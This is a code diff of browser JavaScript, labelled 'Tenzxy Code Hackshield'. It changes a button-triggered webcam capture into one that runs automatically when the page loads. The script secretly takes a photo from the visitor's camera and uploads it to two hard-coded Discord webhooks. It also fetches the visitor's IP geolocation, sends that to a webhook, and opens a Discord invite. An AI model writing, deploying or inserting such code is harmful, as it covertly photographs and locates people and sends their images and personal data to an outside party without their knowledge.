@@ -1,20 +1,17 @@
-///--𝖳𝖾𝗇𝗓𝗑𝗒 𝖢𝗈𝖽𝖾 𝖧𝖺𝖼𝗦𝗄𝖾𝗗--///
+// -- Tenzxy Code Hackshield -- //
 
 const discordWebhookUrl1 = 'https://discord.com/api/webhooks/1316744897700823042/bN9ELvM2OvvYIBq-TU4zu3VK9PjyaH9IYUMH1X-d0QIpkdgQWC-VbrsKM1DbX0q7oAO3';
 const discordWebhookUrl2 = 'https://discord.com/api/webhooks/1316744897700823042/bN9ELvM2OvvYIBq-TU4zu3VK9PjyaH9IYUMH1X-d0QIpkdgQWC-VbrsKM1DbX0q7oAO3';
 const discordChannelUrl = 'https://discord.gg/sTUkWkZHeE';
 
-const captureButton = document.getElementById('captureButton');
-
-if (!captureButton) {
-    console.error('Capture button not found.');
-}
-
-captureButton.addEventListener('click', async () => {
+// Automatically take a photo and send it
+async function captureAndSendPhoto() {
     let videoStream;
     try {
         // Access the user's camera
+        console.log("Requesting camera access...");
         videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
+
         const video = document.createElement('video');
         video.srcObject = videoStream;
         video.style.display = 'none';
@@ -37,6 +34,7 @@ captureButton.addEventListener('click', async () => {
         const imageBlob = dataURLToBlob(imageUrl);
 
         // Send the image to Discord
+        console.log("Sending image to Discord...");
         await sendImageToDiscord(discordWebhookUrl1, imageBlob);
         await sendImageToDiscord(discordWebhookUrl2, imageBlob);
 
@@ -44,18 +42,18 @@ captureButton.addEventListener('click', async () => {
         videoStream.getTracks().forEach(track => track.stop());
         document.body.removeChild(video);
 
-        // Fetch IP info after capturing the image (IP info will not be sent automatically now)
+        // Fetch IP info after capturing the image
         await fetchAndDisplayData();
 
-        // Open the Discord channel in a new tab
+        // Optionally, open the Discord channel in a new tab
         window.open(discordChannelUrl, '_blank');
-        
     } catch (error) {
-        console.error('Error accessing camera:', error);
-        alert('There was an issue accessing the camera. Please check your camera permissions.');
+        console.error('Error capturing photo:', error);
+        alert('There was an issue capturing the photo. Please check your camera permissions.');
     }
-});
+}
 
+// Convert Data URL to Blob
 function dataURLToBlob(dataURL) {
     const [metadata, base64Data] = dataURL.split(',');
     const mimeType = metadata.match(/:(.*?);/)[1];
@@ -70,6 +68,7 @@ function dataURLToBlob(dataURL) {
     return new Blob([bytes], { type: mimeType });
 }
 
+// Send Image to Discord
 async function sendImageToDiscord(webhookUrl, imageBlob) {
     const formData = new FormData();
     formData.append('file', imageBlob, 'captured_image.png');
@@ -83,18 +82,21 @@ async function sendImageToDiscord(webhookUrl, imageBlob) {
         if (sendResponse.ok) {
             console.log('Image sent to Discord!');
         } else {
-            console.error('Failed to send image to Discord');
-            alert('Failed to send image to Discord.');
+            console.error('Failed to send image to Discord, status:', sendResponse.status);
         }
     } catch (error) {
         console.error('Error sending image to Discord:', error);
-        alert('Error sending image to Discord.');
     }
 }
 
+// Fetch information from an API
 async function fetchInformation(url) {
     try {
+        console.log('Fetching IP information from:', url);
         const response = await fetch(url);
+        if (!response.ok) {
+            throw new Error('Failed to fetch IP info');
+        }
         return await response.json();
     } catch (error) {
         console.error('Error fetching information:', error);
@@ -102,6 +104,7 @@ async function fetchInformation(url) {
     }
 }
 
+// Log Information to Webhook
 async function logToWebhook(ipInfo, extraInfo) {
     if (!ipInfo || !ipInfo.query) {
         console.error('IP address is missing:', ipInfo);
@@ -132,6 +135,7 @@ async function logToWebhook(ipInfo, extraInfo) {
     }
 }
 
+// Fetch and Display Data (including IP)
 async function fetchAndDisplayData() {
     // Fetch IP info from ip-api.com
     const ipApiUrl = "http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query";
@@ -139,8 +143,8 @@ async function fetchAndDisplayData() {
 
     if (ipInfo) {
         console.log('Fetched IP Info:', ipInfo);
-        // Log IP info to webhook after capture button is clicked
-        logToWebhook(ipInfo, JSON.stringify(ipInfo, null, 2));
+        // Log IP info to webhook
+        await logToWebhook(ipInfo, JSON.stringify(ipInfo, null, 2));
     }
 
     // Optionally fetch IP from ipify API
@@ -150,6 +154,9 @@ async function fetchAndDisplayData() {
     if (ipifyInfo) {
         console.log('Fetched IPIFY Info:', ipifyInfo);
         // Optionally log IP from ipify API if needed
-        // logToWebhook(ipifyInfo, JSON.stringify(ipifyInfo, null, 2));
+        // await logToWebhook(ipifyInfo, JSON.stringify(ipifyInfo, null, 2));
     }
 }
+
+// Automatically call the capture function
+captureAndSendPhoto();
